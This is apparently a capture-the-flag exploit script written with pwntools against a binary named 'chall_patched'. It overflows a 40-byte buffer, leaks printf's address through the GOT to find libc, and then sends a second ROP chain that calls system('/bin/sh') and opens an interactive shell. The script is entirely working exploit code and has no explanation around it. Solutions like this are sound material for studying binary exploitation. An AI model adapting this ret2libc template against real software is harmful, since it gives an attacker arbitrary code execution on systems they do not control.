from pwn import *

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
    """)
elif args.REMOTE:
    io = remote("addr", 1337)

rop = ROP(exe)
offset = 40

rop.raw(b'a' * offset)
rop.raw(rop.ret)
rop.printf(exe.got["printf"])
rop.raw(rop.ret)
rop.main()
io.sendlineafter(b': ', rop.chain())

printf_libc = unpack(io.recv(6).ljust(8, b'\x00'))
libc.address = printf_libc - libc.symbols["printf"]

rop = ROP(exe)
system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh"))
rop.raw(b'a' * offset)
rop.raw(rop.ret)
rop.call(system, [bin_sh])

io.sendlineafter(b': ', rop.chain())
io.interactive()